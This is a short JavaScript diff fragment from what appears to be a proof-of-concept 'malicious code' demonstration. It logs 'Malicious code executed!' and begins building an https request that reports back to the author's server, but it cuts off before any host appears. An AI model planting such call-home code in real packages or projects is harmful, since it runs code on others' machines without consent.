@@ -2,6 +2,7 @@
 console.log("Malicious code executed!");
 
 // Optionally, send a network request to your server for verification
+// Anything 
 const http = require('https');
 
 const data = JSON.stringify({ message: 'Malicious code executed!' });
